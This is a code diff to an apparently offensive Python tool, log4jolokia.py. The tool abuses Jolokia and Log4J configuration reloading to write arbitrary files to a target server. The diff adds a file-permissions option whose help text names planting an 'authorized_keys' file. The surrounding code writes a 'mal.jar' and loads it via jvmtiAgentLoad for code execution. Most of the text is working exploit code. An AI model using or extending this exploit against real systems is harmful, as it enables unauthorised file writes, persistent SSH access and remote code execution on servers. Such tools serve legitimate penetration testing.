@@ -22,6 +22,8 @@ class Validator(object):
 
 url = Validator(r"^http[s]?://.*$")
 
+permissions = Validator(r"((r|-)(w|-)(x|-)){3}")
+
 ### argparse
 parser = argparse.ArgumentParser(
 			prog='log4jolokia.py',
@@ -66,6 +68,7 @@ elif mode == 'write_file':
 	### write file
 	mode_parser.add_argument('-lf','--local_file', nargs='?',help='Path to local file to be written on the target (Use only with mode: write_file)',required=True)
 	mode_parser.add_argument('-w','--write', nargs='?',help='Path of file to be written on the target (Use only with mode: write_file)',required=True)
+	mode_parser.add_argument('-P','--perm', nargs='?',help='Permissions of the file written on the target. Useful for files like "authorized_keys" that require "rw-------". (Default value is "rwxrwx---") (Use only with mode: write_file)',default="rwxrwx---",type=permissions)
 	mode_parser.add_argument('--tmp_dir', nargs='?',help='''Location of a writable directory. (Default value is "/tmp")
 		E.g. Unix == /tmp
      		Windows == C:/Users/Public''',default='/tmp')
@@ -118,7 +121,7 @@ if args.header:
 xml_template = """<?xml version="1.1" encoding="iso-8859-1"?>
 <Configuration status="debug" name="X" packages="">
 <Appenders>
-<RollingFile name="X" fileName="<<<WRITE_PATH>>>" filePattern="<<<TMP_DIR>>>/x%d{yyyy}%i" append="false">
+<RollingFile name="X" fileName="<<<WRITE_PATH>>>" filePattern="<<<TMP_DIR>>>/x%d{yyyy}%i" append="false" filePermissions="<<<PERMISSIONS>>>">
 <PatternLayout>
 <Pattern>
 <<<PATTERN>>>
@@ -143,7 +146,7 @@ appender.logfile.name=RollingFile
 appender.logfile.fileName=<<<WRITE_PATH>>>
 appender.logfile.filePattern=<<<TMP_DIR>>>/p-%d{yyyy}%i
 appender.logfile.append=false
-appender.logfile.filePermissions=rwxrwxrwx
+appender.logfile.filePermissions=<<<PERMISSIONS>>>
 appender.logfile.layout.type=PatternLayout
 appender.logfile.layout.charset=iso-8859-1
 appender.logfile.policies.type=Policies
@@ -294,7 +297,7 @@ def escape_log4j_pattern(pay):
 
 	return res
 
-def gen_log4j_config(content, path, tmp_dir='/tmp/', verbose=True):
+def gen_log4j_config(content, path, tmp_dir='/tmp/', permissions="rwxrwx---", verbose=True):
 	# check if content contains any XML restricted chars
 	# if all valid => direct xml
 	# if any invalid => xml contains properties that contains file to be written
@@ -318,6 +321,7 @@ def gen_log4j_config(content, path, tmp_dir='/tmp/', verbose=True):
 		xml = xml.replace("<<<TMP_DIR>>>", tmp_dir)
 		xml = xml.replace("<<<WRITE_PATH>>>", path)
 		xml = xml.replace("<<<PATTERN>>>", content)
+		xml = xml.replace("<<<PERMISSIONS>>>", permissions)
 		print("[+] Generated Log4J XML configuration")
 	else:
 		content = json_encode(escape_log4j_pattern(content)).replace("\\","\\\\")
@@ -325,12 +329,14 @@ def gen_log4j_config(content, path, tmp_dir='/tmp/', verbose=True):
 		prop = prop.replace("<<<TMP_DIR>>>", tmp_dir)
 		prop = prop.replace("<<<WRITE_PATH>>>", path)
 		prop = prop.replace("<<<PATTERN>>>", content)
+		prop = prop.replace("<<<PERMISSIONS>>>", permissions)
 		print("[+] Generated Log4J Properties configuration")
 		prop = escape(prop)
 		xml = xml_template
 		xml = xml.replace("<<<TMP_DIR>>>", tmp_dir)
 		xml = xml.replace("<<<WRITE_PATH>>>", tmp_file)
 		xml = xml.replace("<<<PATTERN>>>", prop)
+		xml = xml.replace("<<<PERMISSIONS>>>", "rwxrwx---")
 		print("[+] Embedded Properties configuration in a XML configuration")
 
 	return xml, tmp_file
@@ -356,7 +362,7 @@ def setConfigText(target, xml, mbean, verbose=True):
 		print("[!] Exiting")
 		exit(1)
 
-def write_file(target, local_file, path, mbean, tmp_dir="/tmp", verbose=True):
+def write_file(target, local_file, path, mbean, tmp_dir="/tmp", permissions="rwxrwx---", verbose=True):
 	if verbose:
 		print(f"[.] Reading content from {local_file}")
 
@@ -365,7 +371,7 @@ def write_file(target, local_file, path, mbean, tmp_dir="/tmp", verbose=True):
 	f.close()
 
 	# generate valid Log4J config with static pattern
-	log4j_xml, tmp_file = gen_log4j_config(content, path, tmp_dir)
+	log4j_xml, tmp_file = gen_log4j_config(content, path, tmp_dir, permissions)
 
 	# send XML to setConfigText()
 	# do this twice in order to flush the buffer writing to the file
@@ -416,7 +422,7 @@ If you agree with the above enter "yes" to continue: """)
 		exit(0)
 
 	path = tmp_dir + "/mal.jar"
-	write_file(target, jar, path, mbean, tmp_dir)
+	write_file(target, jar, path, mbean, tmp_dir, permissions="rwxrwx---")
 
 	# jvmtiAgentLoad
 	data={"arguments": [path], "mbean": "com.sun.management:type=DiagnosticCommand", "operation": "jvmtiAgentLoad([Ljava.lang.String;)", "type": "exec"}
@@ -475,7 +481,7 @@ mbean = get_mbeans(target, auth, headers)[0]
 if mode == "read_file":
 	read_file(target, args.read, mbean)
 elif mode == "write_file":
-	write_file(target, args.local_file, args.write, mbean, args.tmp_dir)
+	write_file(target, args.local_file, args.write, mbean, args.tmp_dir, args.perm)
 elif mode == "exec_jar":
 	exec_jar(target, args.jar, mbean, args.tmp_dir)
 elif mode == "exec_script":
